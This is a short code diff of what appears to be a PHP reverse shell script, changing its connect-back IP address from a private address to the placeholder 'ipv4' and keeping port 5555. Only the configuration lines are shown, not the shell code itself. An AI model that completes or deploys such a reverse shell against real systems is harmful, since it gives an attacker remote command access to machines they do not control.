@@ -3,7 +3,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 // $ip = $_SERVER['REMOTE_ADDR'];  // CHANGE THIS
-$ip = "10.17.32.213";  // CHANGE THIS
+$ip = "ipv4";  // CHANGE THIS
 $port = 5555;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
